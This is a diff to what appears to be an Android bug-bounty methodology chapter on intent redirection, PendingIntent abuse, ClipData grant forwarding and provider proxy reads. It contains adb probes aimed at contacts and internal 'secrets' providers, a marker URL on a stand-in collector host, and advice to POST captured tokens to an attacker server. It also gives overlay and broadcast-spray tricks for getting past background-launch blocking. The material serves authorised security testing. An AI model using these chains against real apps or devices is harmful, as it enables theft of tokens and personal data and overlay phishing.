 | **Applies to** | all |
-| **Requires** | exported-activity, deeplink |
 | **Maps to** | `risks/content-resolver` — the documented validators `belongsToCurrentApplication()`, `isExported()` and `wasGrantedPermission()`, whose absence is the bug; MASTG-KNOW-0117 |
 
 - **Test:** The proxy-read direction. The app receives a URI and reads it on the caller's behalf, either
@@ -2300,9 +2342,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   scenarios, one mechanism: the read happens with the victim's identity.
 - **How:**
   ```bash
-  grep -rn 'openInputStream\|openOutputStream\|getContentResolver()\.query\|openAssetFileDescriptor' out/sources/ -B10 \
+  grep -rn 'openInputStream\|openOutputStream\|getContentResolver()\.query\|openAssetFileDescriptor' "$DEC/jadx/sources/" -B10 \
     | grep -nE 'getIntent\(\)|getData\(\)|EXTRA_STREAM|getClipData'
-  grep -rn 'checkUriPermission\|resolveContentProvider\|belongsToCurrentApplication\|isExported' out/sources/
+  grep -rn 'checkUriPermission\|resolveContentProvider\|belongsToCurrentApplication\|isExported' "$DEC/jadx/sources/"
   ```
   The documented safe shape to compare against:
   ```kotlin
@@ -2316,8 +2358,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   Probes:
   ```bash
-  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
-  adb shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.target.app.internalprovider/secrets/1'
+  adb -s "$SERIAL" shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.android.contacts/contacts'
+  adb -s "$SERIAL" shell am start -n com.target.app/.Import --eu android.intent.extra.STREAM 'content://com.target.app.internalprovider/secrets/1'
   ```
 - **Proof:** The app rendering or uploading contacts, or its own internal provider's rows — the proxy
   request body is the proof. Mask the values, keep the column names.
@@ -2344,7 +2386,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   `checkCallingPermission(p);` called for side effect with its `int` result discarded.
 - **How:**
   ```bash
-  grep -rnE 'getCallingActivity\(\)|getCallingPackage\(\)|checkCallingPermission\(' out/sources/ | grep -vE 'Binder\.getCallingUid'
+  grep -rnE 'getCallingActivity\(\)|getCallingPackage\(\)|checkCallingPermission\(' "$DEC/jadx/sources/" | grep -vE 'Binder\.getCallingUid'
   ```
   Call each hit both ways from the stub and log which branch runs:
   ```java
@@ -2367,7 +2409,6 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it unlocks a partner-tier flow |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | exported-activity, deeplink |
 | **Maps to** | drozer `android.intent.extra.REFERRER` (verified in the extras list in `src/drozer/android.py`); `risks/access-control-to-exported-components` |
 
 - **Test:** Because `getCallingPackage()` is null for plain `startActivity`, developers reach for the
@@ -2375,7 +2416,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   so any authorisation keyed on it is decorative.
 - **How:**
   ```bash
-  grep -rnE 'EXTRA_REFERRER|getReferrer\(\)|"referrer"|source_app|partner_id|from_app|caller_id' out/sources/ -B4 -A8
+  grep -rnE 'EXTRA_REFERRER|getReferrer\(\)|"referrer"|source_app|partner_id|from_app|caller_id' "$DEC/jadx/sources/" -B4 -A8
   ```
   ```
   dz> run app.activity.start --component com.target.app com.target.app.PartnerEntryActivity \
@@ -2383,7 +2424,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
         --flags ACTIVITY_NEW_TASK
   ```
   ```bash
-  adb shell am start -n com.target.app/.PartnerEntryActivity \
+  adb -s "$SERIAL" shell am start -n com.target.app/.PartnerEntryActivity \
     --es android.intent.extra.REFERRER 'android-app://com.trusted.partner'
   ```
 - **Proof:** The activity granting partner-tier behaviour — skipping a consent screen, auto-linking an
@@ -2402,7 +2443,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **Severity ceiling** | Critical |
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on the exfiltrated token |
 | **Attacker** | AM-03 (attacker app declares **only** `INTERNET`) |
-| **Applies to** | any app using GMS SMS User Consent or SMS autofill — typically OTP, login and card-3DS screens. The BAL constraint applies **API 34+** |
+| **Applies to** | any app using GMS SMS User Consent or SMS autofill — typically OTP, login and card-3DS screens. The background-launch constraint applies on every device you will test (Android 10+, API 29); 34/35 only changed what PendingIntent senders/creators donate |
 | **Requires** | device |
 | **Maps to** | `developers.google.com/identity/sms-retriever/user-consent/request` × `risks/intent-redirection`; CVE-2021-4438 (React Native SMS User Consent) |
 
@@ -2415,10 +2456,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   proves it is a defect, not a design choice.
 - **How:**
   ```bash
-  grep -rn 'SmsRetriever.SMS_RETRIEVED_ACTION\|com.google.android.gms.auth.api.phone.SMS_RETRIEVED\|EXTRA_CONSENT_INTENT' out/sources/ -A6
-  grep -rn 'registerReceiver' out/sources/ | grep -i sms
-  grep -rn 'registerReceiver(.*,\s*2\s*)' out/sources/     # ContextCompat RECEIVER_EXPORTED == 2
-  grep -rn 'SmsRetriever.SEND_PERMISSION' out/sources/     # the guarded sibling, if any
+  grep -rn 'SmsRetriever.SMS_RETRIEVED_ACTION\|com.google.android.gms.auth.api.phone.SMS_RETRIEVED\|EXTRA_CONSENT_INTENT' "$DEC/jadx/sources/" -A6
+  grep -rn 'registerReceiver' "$DEC/jadx/sources/" | grep -i sms
+  grep -rn 'registerReceiver(.*,\s*2\s*)' "$DEC/jadx/sources/"     # ContextCompat RECEIVER_EXPORTED == 2
+  grep -rn 'SmsRetriever.SEND_PERMISSION' "$DEC/jadx/sources/"     # the guarded sibling, if any
   ```
   `am broadcast` cannot carry the `Status` Parcelable, so this needs a stub APK:
   ```java
@@ -2437,12 +2478,22 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   session payload, token store or database under `files/`. Then POST it to your own server and screenshot
   the C2 view captured on a separate device, with no shell, no adb and no root.
 - **Escalation:** Point `data=` at a **protected provider the victim can reach** (contacts, call log) for a
-  proxied provider read (D08-034). **BAL gate, decisive on API 34+:** the victim can only launch the
-  redirected Intent while it has a visible window (`BAL_ALLOW_VISIBLE_WINDOW`); if the attacker is
-  foreground the victim is backgrounded and the launch is `BAL_BLOCK`. So spray the broadcast repeatedly
-  and `moveTaskToBack()` immediately, launched over the victim's screen, so the victim resumes to the
-  foreground before a spray lands. Report it as "captures on the next login", **not** "unconditional" — the
-  precondition is inherent, because the receiver only exists while the OTP/3DS screen is up.
+  proxied provider read (D08-034). **BAL gate, decisive since Android 10 (API 29):** background activity
+  launches from an app with no visible window have been blocked since API 29 for all apps (API 34 stopped
+  PendingIntent senders donating their privilege by default and API 35 the creators — D08-048, D08-067), so
+  the victim can only launch the redirected Intent while it has a visible window
+  (`BAL_ALLOW_VISIBLE_WINDOW`); if the attacker is foreground the victim is backgrounded and the launch is
+  `BAL_BLOCK`. Keep the stub un-frozen while the victim is visible: overlay the victim with a translucent
+  activity (`Theme.Translucent.NoTitleBar`, no touch interception) so the victim's task stays visible and the
+  stub stays foreground, or fire each spray from an `AlarmManager`/`JobScheduler` callback; never rely on a
+  loop in a backgrounded process — the cached-app freezer stops it within seconds on Android 14+ and its
+  broadcasts are deferred, which reads as "never captures". End every spray with a positive-control
+  broadcast to your own receiver and log its arrival time — a sweep with no control line is inconclusive,
+  not negative. Verify the BAL outcome from the `ActivityTaskManager` line (from an app-UID sender; the shell
+  is exempt from BAL), not from the screen. Report it as "captures on the next login", **not**
+  "unconditional" — the precondition is inherent, because the receiver only exists while the OTP/3DS screen
+  is up. This row owns the launch-gadget/self-grant chain; D05-050 tests the receiver's registration and
+  D13-049 the OTP injection — settle D05-050 first and reuse its stub.
 - **Ruled out when:** The receiver is registered `RECEIVER_NOT_EXPORTED`, or requires
   `SmsRetriever.SEND_PERMISSION`, or validates the consent Intent (component/scheme allow-list plus
   `FLAG_GRANT_*` stripping via `androidx.core.content.IntentSanitizer`) before launching. Generalises to
@@ -2466,20 +2517,20 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **How:** There are only five shapes. Enumerate which exist here, by name and `file:line`:
   ```bash
   # 1. result echo — the victim hands the Intent (and its grants) back to you
-  grep -rnE 'setResult\(' out/sources/ -A2 | grep -nE 'getIntent\(\)|intent\)'
+  grep -rnE 'setResult\(' "$DEC/jadx/sources/" -A2 | grep -nE 'getIntent\(\)|intent\)'
   # 2. redirect target you control — component=<attacker> + FLAG_GRANT_* on the nested Intent
-  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/
+  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' "$DEC/jadx/sources/"
   # 3. self-grant from an exported receiver launching an attacker Intent (D08-061)
-  grep -rn 'EXTRA_CONSENT_INTENT\|registerForActivityResult\|launcher.launch(' out/sources/
+  grep -rn 'EXTRA_CONSENT_INTENT\|registerForActivityResult\|launcher.launch(' "$DEC/jadx/sources/"
   # 4. a PendingIntent you can send with your own component filled in (D08-037, D08-040)
   # 5. the app's own outbound upload/webhook that you can aim at your collector
-  grep -rnE 'okhttp|Retrofit|HttpURLConnection|multipart|EXTRA_STREAM' out/sources/ -B8 | grep -nE 'getIntent\(\)|getData\(\)'
+  grep -rnE 'okhttp|Retrofit|HttpURLConnection|multipart|EXTRA_STREAM' "$DEC/jadx/sources/" -B8 | grep -nE 'getIntent\(\)|getData\(\)'
   ```
   Then **prove the copy, not the open.** A share sheet rendering only proves `openInputStream()` returned;
   a triager will say the app may have stat'd the file and nothing more. Aim the same primitive at an
   artefact the app *just created* on this run, and run the negative control:
   ```bash
-  adb shell run-as com.target.app ls -l cache/ | tail -5     # note a freshly created 0_<name>
+  adb -s "$SERIAL" shell run-as com.target.app ls -l cache/ | tail -5     # note a freshly created 0_<name>
   # positive: point the primitive at cache/0_<name>  -> the sheet/preview renders it
   # negative: point it at cache/0_<random-never-created> -> nothing renders
   ```
@@ -2510,35 +2561,38 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **How:** **Marker.** Put a random 8+ character token in every value you inject, and search the baseline
   before you claim anything:
   ```bash
-  M=$(head -c 12 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 10); echo "$M"
+  M=$(head -c 48 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 10); [ ${#M} -eq 10 ] || { echo 'marker too short'; exit 1; }; echo "$M"   # 12 bytes filtered to [a-z0-9] can leave 5-6 chars
   # 1. BASELINE: drive the app normally, with no payload, and prove the marker is absent
-  adb logcat -c; adb shell monkey -p com.target.app 1 >/dev/null; sleep 5
-  adb logcat -d | grep -c "$M"          # must be 0
-  adb shell dumpsys activity activities | grep -c "$M"   # must be 0
+  adb -s "$SERIAL" logcat -c; adb -s "$SERIAL" shell monkey -p com.target.app 1 >/dev/null; sleep 5
+  adb -s "$SERIAL" logcat -d | grep -c "$M"          # must be 0
+  adb -s "$SERIAL" shell dumpsys activity activities | grep -c "$M"   # must be 0
   # 2. TEST: the same marker inside the nested Intent
   #    inner.putExtra("url", "https://collector.invalid/" + M)  /  --es token "$M"
-  adb logcat -d | grep -n "$M"
+  adb -s "$SERIAL" logcat -d | grep -n "$M"
   ```
   Never use `test`, `evil`, `attacker`, `poc`, `payload`, `1234` or your own domain as the marker, and do
   not put them in your stub's package name either — a target that logs caller packages will then print
-  something a reviewer discounts on sight. **Paired refusal.** The differential *is* the finding:
+  something a reviewer discounts on sight. **Paired refusal.** The differential *is* the finding — and it
+  is void from a root shell:
   ```bash
-  adb shell am start -n com.target.app/.internal.NonExportedActivity   # must be REFUSED
+  adb -s "$SERIAL" shell id   # must print uid=2000(shell); uid=0 (adb -s "$SERIAL" root, rooted AVD) never exercises the export check — adb -s "$SERIAL" unroot, or run the refusal control from the probe app, which is the AM-03 ground truth anyway
+  adb -s "$SERIAL" shell am start -n com.target.app/.internal.NonExportedActivity   # must be REFUSED
   # java.lang.SecurityException: Permission Denial: starting Intent { ... } not exported from uid ...
-  adb shell am start -n com.attacker.poc/.Go                            # the redirect: must SUCCEED
-  adb shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
+  adb -s "$SERIAL" shell am start -n com.attacker.poc/.Go                            # the redirect: must SUCCEED
+  adb -s "$SERIAL" shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
   ```
   **Classify every refusal before you trust it.** A failure is not proof of a control; several layers sit
   in front of the export check and each produces a different string:
   ```bash
-  adb logcat -d -s ActivityTaskManager ActivityManager PackageManager AndroidRuntime | tail -40
+  adb -s "$SERIAL" logcat -d -s ActivityTaskManager ActivityManager PackageManager AndroidRuntime | tail -40
   ```
 
   | Refusal text | What it actually means |
   |---|---|
+  | *no refusal at all* — the direct `am start -n` on the non-exported component succeeds | your shell is uid 0 (`adb root`, rooted AVD) or system: the export check is never exercised; the control is void. The same holds for `content query` reaching an `exported="false"` provider from a root shell |
   | `Permission Denial: ... not exported from uid` | the export check — the control you wanted to test |
   | `Permission Denial: ... requires <permission>` | a permission gate, not export |
-  | `Abort background activity starts` / `BAL_BLOCK` | background-launch policy (API 34+), says nothing about export |
+  | `Abort background activity starts` / `BAL_BLOCK` | background-launch policy (API 29+; sender/creator donation rules at 34/35), says nothing about export |
   | `Calling startActivity() from outside of an Activity context ... FLAG_ACTIVITY_NEW_TASK` | your own harness bug |
   | `Intent does not match component's intent filter` / `Access blocked` | Android 16 platform hardening (D08-004), not an app fix |
   | app-thrown `IllegalArgumentException`/validation exception in the app's own frames | the application-level control — the only true negative |
@@ -2561,6 +2615,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | n/a (method) |
 | **Attacker** | n/a |
 | **Applies to** | the D08-001 census, the D08-005 SDK sweep, and every Critical/High in this chapter |
+| **Record** | logs/D08-064-counts.txt (the count line of every sweep); logs/D08-064-pairs.txt; logs/D08-064.txt (session header with `adb shell id`) |
 | **Maps to** | the Shell-Loop Ban ("always count your results"); the Multi-Tool Reproduction Bar for Critical/High; CLAUDE.md Rule 3 (`adb shell` is uid 2000 and is not AM-03) |
 
 - **Test:** The D08-001 join is a loop over hundreds of grep hits, and a zsh array loop that iterates zero
@@ -2569,17 +2624,18 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **How:**
   ```python
   #!/usr/bin/env python3
-  # d08_sweep.py — extractor -> sink census with an explicit count. usage: d08_sweep.py out/sources
+  # d08_sweep.py — extractor -> sink census with an explicit count. usage: d08_sweep.py "$DEC/jadx/sources"
   import os, re, sys
-  ROOT = sys.argv[1] if len(sys.argv) > 1 else "out/sources"
+  ROOT = sys.argv[1]                                   # no default: a wrong tree must fail loudly, not print files=0
   SKIP = re.compile(r"^(android|androidx|kotlin|kotlinx|com/google/android/material)/")
-  EXTRACT = re.compile(r"getParcelableExtra\(|getParcelableArrayListExtra\(|getParcelable\(|"
+  EXTRACT = re.compile(r"getParcelableExtra\(|getParcelableArrayListExtra\(|getParcelableArrayList\(|getParcelable\(|"
                        r"getSerializableExtra\(|Intent\.parseUri\(|Intent\.getIntent\(|"
-                       r"unmarshall\(|readParcelable\(|android\.intent\.extra\.INTENT")
+                       r"unmarshall\(|readParcelable\(|android\.intent\.extra\.INTENT|"
+                       r"getExtras\(\)\.get\(|extras\.get\(|\(PendingIntent\)\s*[\w.]*\.get|\(Intent\)\s*[\w.]*\.get\(")
   SINK = re.compile(r"startActivity\(|startActivityForResult\(|startActivities\(|startService\(|"
                     r"startForegroundService\(|bindService\(|sendBroadcast\(|sendOrderedBroadcast\(|"
-                    r"setResult\(|\.send\(")
-  files = hits = pairs = errors = 0
+                    r"setResult\(|\.send\(|startIntentSender(ForResult|FromChild)?\(|getIntentSender\(\)|sendIntent\(")
+  files = hits = pairs = errors = wrapper_hits = 0
   for dirpath, _, names in os.walk(ROOT):
       for n in names:
           if not n.endswith((".java", ".kt")):
@@ -2600,27 +2656,44 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
               if any(SINK.search(w) for w in lines[i:i + 12]):
                   pairs += 1
                   print("PAIR %s:%d: %s" % (rel, i + 1, line.strip()[:120]))
-  print("# files=%d extractor_hits=%d extractor_sink_pairs=%d read_errors=%d"
-        % (files, hits, pairs, errors), file=sys.stderr)
+              elif len(lines) < 60:                      # R8 wrapper hop: a tiny helper class is the only direct caller — follow it to ITS callers
+                  wrapper_hits += 1
+                  cls = os.path.splitext(n)[0]
+                  print("PAIR-VIA-WRAPPER %s:%d: follow callers of %s (grep -rnE '\\b%s[.]' ROOT)" % (rel, i + 1, cls, cls))
+  print("# files=%d extractor_hits=%d extractor_sink_pairs=%d wrapper_hits=%d read_errors=%d"
+        % (files, hits, pairs, wrapper_hits, errors), file=sys.stderr)
   ```
   ```bash
-  python3 d08_sweep.py out/sources > /tmp/d08_pairs.txt 2>/tmp/d08_counts.txt
-  cat /tmp/d08_counts.txt      # files= must be in the thousands; a files=0 line means the path is wrong
-  wc -l /tmp/d08_pairs.txt
+  python3 d08_sweep.py "$DEC/jadx/sources" > "$E/logs/D08-064-pairs.txt" 2> "$E/logs/D08-064-counts.txt"
+  cat "$E/logs/D08-064-counts.txt"      # files= must be in the thousands; a files=0 line means the path is wrong
+  wc -l "$E/logs/D08-064-pairs.txt"
   ```
-  **Two stacks for every Critical/High.** `adb shell` runs as uid 2000 (shell), which holds privileges no
-  installed app has, and drozer's agent runs as its own app — so reproduce each rated finding through two
-  independent paths, at least one of which is a **zero-permission attacker APK**:
+  **Device-shell quoting.** Any `--es/--eu/-d` value containing `; | & $ ( ) ? * #` or a space goes through
+  `adb shell` double-quoted with the value single-quoted inside (`adb -s "$SERIAL" shell "am start ... --es k 'a;b'"`):
+  adb joins its arguments unquoted and the device `sh` re-parses them, so a value quoted only for the host
+  arrives truncated at the `;`. Prove the quoting once per session with a positive control — send
+  `--es probe 'a;b'` to your stub and confirm the stub logs `a;b` whole.
+  **Repeatable fires.** `-S` force-stops the stub first; when a sweep varies only extras, launch Intents are
+  `filterEquals`-equal and are delivered to the running top instance (`Warning: Activity not started, intent
+  has been delivered to currently running top-most instance`) and `onNewIntent` is not reliably observed —
+  give each fire a distinct action (`-a probe.fire.$N`) or use `-S`. The stub mirrors every proof line to a
+  file under `getExternalFilesDir()` and the harness pulls it, because some stock builds drop app-level
+  `Log.i` from logcat; a logcat-only proof is incomplete.
+  **Two stacks for every Critical/High.** `adb shell` is uid 2000 (shell) on a user build or after
+  `adb unroot`, and **uid 0** on a rooted AVD or after `adb root` — write `adb shell id` into the log header
+  of every session; either way it holds privileges no installed app has, and drozer's agent runs as its own
+  app — so reproduce each rated finding through two independent paths, at least one of which is a
+  **zero-permission attacker APK**:
   ```bash
   # stack 1 — the attacker APK (the one that establishes AM-03; commit its manifest as evidence)
-  adb install -r attacker-poc.apk && adb shell am start -n com.attacker.poc/.Go
-  adb shell dumpsys package com.attacker.poc | sed -n '/requested permissions/,/^$/p'
+  adb -s "$SERIAL" install -r attacker-poc.apk && adb -s "$SERIAL" shell am start -S -n com.attacker.poc/.Go
+  adb -s "$SERIAL" shell dumpsys package com.attacker.poc | sed -n '/requested permissions/,/^$/p'
   # stack 2 — drozer or a Frida-driven send from a second process
   ```
   ```
   dz> run app.activity.start --component com.target.app com.target.app.ProxyActivity --extra ...
   ```
-- **Proof:** A count line for every sweep (`files=`, `extractor_hits=`, `extractor_sink_pairs=`) and, for
+- **Proof:** A count line for every sweep (`files=`, `extractor_hits=`, `extractor_sink_pairs=`, `wrapper_hits=`) and, for
   each Critical/High, two reproductions from different stacks with the attacker manifest showing
   `requested permissions: android.permission.INTERNET` and nothing else.
 - **Escalation:** n/a.
@@ -2647,7 +2720,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   3. Have I reproduced the full chain end to end at least twice, and at least once from an app UID rather
      than `adb shell` (D08-064)?
   4. Is a gate still standing? A re-auth prompt on the internal screen, a device-bound token, an encrypted
-     file whose Keystore key you cannot use off-device, `BAL_BLOCK` on API 34+, or Android 16's default
+     file whose Keystore key you cannot use off-device, `BAL_BLOCK` (the API 29+ background-launch rule; 34/35 changed only what PendingIntent senders/creators donate), or Android 16's default
      hardening with no `removeLaunchSecurityProtection()` in the app. If yes, it is "primitive present" at
      a lower severity, documented honestly.
   5. Has the programme rejected this class before? Several programmes exclude "URIs leaked because a
@@ -2679,7 +2752,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | n/a (deliverable and submission mechanics) |
 | **Attacker** | n/a |
 | **Applies to** | every D08 submission |
-| **Maps to** | the five-screenshot state-change pattern; HAR/transcript sanitising and the PII split (mask the secret, leave the correlation data visible); chain-filing order — primitives first so their ids exist, then the consumer, then backfill; "one fix equals one bounty"; Bugcrowd VRT `broken_access_control.exposed_sensitive_android_intent` carries **priority null**, so the priority comes entirely from your narrative; `docs/04-poc-and-evidence-standard.md` |
+| **Maps to** | the five-screenshot state-change pattern; HAR/transcript sanitising and the PII split (mask the secret, leave the correlation data visible); chain-filing order — primitives first so their ids exist, then the consumer, then backfill; "one fix equals one bounty"; Bugcrowd VRT `broken_access_control.exposed_sensitive_android_intent` carries **priority *varies*** (`data/vrt.csv`), so the priority comes entirely from your narrative; `docs/04-poc-and-evidence-standard.md` |
 
 - **Test:** A redirection finding is a state change (a component ran, a grant was issued, a transaction
   repeated), so one screenshot of a screen is not an evidence package. Capture five artefacts in one
@@ -2746,19 +2819,150 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
 - **Ruled out when:** n/a — unconditional for every submission in this chapter.
 
+### D08-067 · Exported component re-sends a caller-supplied `PendingIntent` — background-launch privilege donation
+
+| | |
+|---|---|
+| **Severity ceiling** | Medium standalone; High with a phishing consumer (D04) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
+| **Attacker** | AM-03 |
+| **Applies to** | any exported activity, service or receiver that calls `send()`/`startIntentSender*()` on a token it received; on API 34+ the sender donates only with an `ActivityOptions` opt-in for targetSdk >= 34 senders, on API <= 33 a visible sender donated its privilege implicitly |
+| **Requires** | device |
+| **Maps to** | `guide/components/activities/background-starts`; `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15`; MASTG-KNOW-0024; MASWE-0032 |
+| **Record** | logs/D08-067.txt (the `ActivityTaskManager` BAL lines, sender and control); screenshots/D08-067-1.png |
+
+- **Skip when:** `grep -rnE '\(PendingIntent\)|IntentSender' "$DEC/jadx/sources" | grep -vE '^(android|androidx)/' | grep -lE '\.send\(|startIntentSender'` is empty → notes: "no exported component sends a received PendingIntent/IntentSender (grep count 0)".
+- **Test:** `send()` runs as the token's **creator**, so the attacker's own token borrows no identity and the
+  shape is a graveyard row on its own. What the app can still donate is its background-activity-launch
+  standing: a visible victim that sends an attacker-created token whose target is the attacker's activity
+  launches that activity from the background on the attacker's behalf — the substrate for overlay and
+  phishing on modern devices. D08-048 covers the app's **own** token handed out; this row is the app as the
+  sender of a foreign one.
+- **How:**
+  ```bash
+  grep -rnE '\(PendingIntent\)|getParcelableExtra\([^)]*\)[^;]*PendingIntent|IntentSender' -A6 "$DEC/jadx/sources" | grep -nE '\.send\(|startIntentSender|sendIntent\('
+  grep -rnE 'setPendingIntentBackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_ALLOWED' "$DEC/jadx/sources"
+  ```
+  Stub: create an immutable `PendingIntent.getActivity` for one of your own activities, put it under the
+  key the component reads (D08-001 worksheet), start the component, `moveTaskToBack(true)`, then:
+  ```bash
+  adb -s "$SERIAL" logcat -s ActivityTaskManager | grep -E 'balAllowedByPiSender|resultIfPiSenderAllowsBal|realCallerStartMode|BAL_ALLOW|BAL_BLOCK' | tee logs/D08-067.txt
+  # legacy sender semantics on a userdebug/AVD image without downloading an old image:
+  adb -s "$SERIAL" shell am compat disable 244637991 <victim-pkg>   # DEFAULT_RESCIND_BAL_PRIVILEGES_FROM_PENDING_INTENT_SENDER (API<=33 behaviour)
+  adb -s "$SERIAL" shell am compat disable 296478951 <victim-pkg>   # the creator-side rule
+  ```
+- **Proof:** The attacker activity on screen while the attacker has no visible window, with the
+  `ActivityTaskManager` line naming the victim as `realCallingPackage`/sender and `BAL_ALLOW_*` by sender
+  privilege. Control: the same `send()` from the stub itself logs `BAL_BLOCK`. The shell is exempt from BAL,
+  so `adb shell am start` proves nothing here.
+- **Escalation:** → D04 overlay / credential capture; → D08-048 when the app also passes an
+  `ActivityOptions` opt-in.
+- **Ruled out when:** The `send()` is wrapped with `MODE_BACKGROUND_ACTIVITY_START_DENIED` on API 34+
+  (file:line), or the ATM line shows `BAL_BLOCK` with the victim visible, or no exported component calls
+  `send()`/`startIntentSender*()` on a received token (grep count recorded).
+
+### D08-068 · ClipData and `EXTRA_STREAM` ride the forwarded grant past a `getData()`-only sanitiser
+
+| | |
+|---|---|
+| **Severity ceiling** | High; Critical when the granted file yields a token (as D08-010) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) on a token file; otherwise `broken_access_control.exposed_sensitive_android_intent` (varies) |
+| **Attacker** | AM-03 |
+| **Applies to** | every forwarder in the D08-001 worksheet; precondition D08-006 (a grantable authority) |
+| **Requires** | provider |
+| **Maps to** | `risks/intent-redirection` (flag list); AOSP `Intent.setClipData` javadoc (ClipData URIs receive the grant when `FLAG_GRANT_*` is set) and `migrateExtraStreamToClipData()`; MASTG-DEMO-0123; MASTG-KNOW-0117; MASWE-0032 |
+| **Record** | logs/D08-068.txt (`dumpsys activity permissions` before/after); screenshots/D08-068-1.png |
+
+- **Skip when:** D08-006 found no grantable authority → notes: "no grantable authority; clip/stream grants have nothing to bind to".
+- **Test:** The grant attaches to the data URI **and** to every URI in `ClipData`; for
+  `ACTION_SEND`/`SEND_MULTIPLE` the platform migrates `EXTRA_STREAM` into ClipData at send time. A forwarder
+  that clears or validates only `getData()` still issues the grant for the clip/stream URIs — so a fix of
+  `setData(null)` or an authority check on `getData()` closes D08-010 and leaves this row open. D08-052
+  names `setClipData` on the PendingIntent side; this is the inbound redirect side.
+- **How:**
+  ```bash
+  grep -rnE 'setClipData|getClipData|EXTRA_STREAM|setData\(null\)|getAuthority\(\)' "$DEC/jadx/sources" -B4 -A4 | grep -nE 'startActivity|setResult|removeFlags'
+  ```
+  Stub: the same outer intent as D08-010, with the inner intent's data URI left **null** and the victim's
+  provider URI carried in `ClipData.newRawUri(...)` with `FLAG_GRANT_READ_URI_PERMISSION`; variant:
+  `ACTION_SEND` with the URI in `EXTRA_STREAM` (a `putParcelableArrayListExtra` list) and no ClipData.
+- **Proof:** `adb -s "$SERIAL" shell dumpsys activity permissions` lists the clip URI granted to your UID
+  after the forward and `openInputStream` returns the bytes; control: the identical inner intent without
+  ClipData/`EXTRA_STREAM` yields no grant.
+- **Escalation:** → D08-011/012 (prefix/persistable on the clip URI); → D11 for the token.
+- **Ruled out when:** The forwarder rebuilds the intent with `setClipData(null)`, removes `EXTRA_STREAM` and
+  masks the grant flags (an `IntentSanitizer` with no `allowClipData*` drops it) — confirmed by both probes,
+  not by reading the builder.
+
+### D08-069 · `createPendingResult()` token handed out → result injection without a picker tap
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
+| **Attacker** | AM-03 where the token leaves through an exported component or widget; AM-04 via a notification |
+| **Applies to** | all |
+| **Maps to** | `Activity.createPendingResult` reference (the sent Intent is delivered as the activity's result); MASTG-TEST-0375; MASTG-KNOW-0138; MASWE-0032 |
+| **Record** | logs/D08-069.txt |
+
+- **Skip when:** `grep -rn 'createPendingResult(' "$DEC/jadx/sources" | grep -vE '^(android|androidx)/'` is empty → notes: "no createPendingResult in app code".
+- **Test:** A PendingIntent from `createPendingResult(requestCode, intent, flags)` delivers whatever the
+  sender fills in to `onActivityResult(requestCode, ...)` of the creating activity. If that token leaves the
+  process (the D08-047 routes: notification, widget, SDK, exported service), any holder injects
+  `data`/extras into the result path that D08-035 showed the app trusts — no chooser, no tap. It is the
+  no-interaction variant of D08-035, and D08-047 never enumerates this kind because its `send()` delivers a
+  **result** rather than starting a component.
+- **How:** `grep -rn -B4 -A8 'createPendingResult(' "$DEC/jadx/sources"`; capture the token via
+  D08-040/047; then `send()` it from your process with `Activity.RESULT_OK` and a fill-in Intent carrying
+  the URI or extra the D08-035 handler consumes (mutable token), or replay the base result (immutable).
+- **Proof:** The victim's `onActivityResult` consuming the injected URI/extra — Frida trace of the handler
+  or the upload in the proxy — from a `send()` issued by your process, with no picker shown.
+- **Escalation:** As D08-035 (→ D11/D13/D15); drop the "one user tap" precondition in the rating.
+- **Ruled out when:** No `createPendingResult` token leaves the process, or the token is `FLAG_IMMUTABLE`
+  and the handler validates scheme and authority regardless of request code (D08-035 Ruled out when).
+
+### D08-070 · Forwarded extra concatenated into `loadDataWithBaseURL` on a trusted base origin
+
+| | |
+|---|---|
+| **Severity ceiling** | High; Critical when the base origin carries a session or a JS bridge |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); `broken_authentication_and_session_management.authentication_bypass` (P1) via a bridge in the privileged origin |
+| **Attacker** | AM-03 (exported extra); AM-02 when a deep-link parameter feeds the same extra |
+| **Applies to** | apps with a WebView whose HTML is built in Java/Kotlin string templates |
+| **Requires** | webview |
+| **Maps to** | Google Mobile VRP "Cross-app scripting"; MASWE-0032; MASTG-TEST-0364; WebView origin semantics of `loadDataWithBaseURL` (script runs in the base URL's origin) |
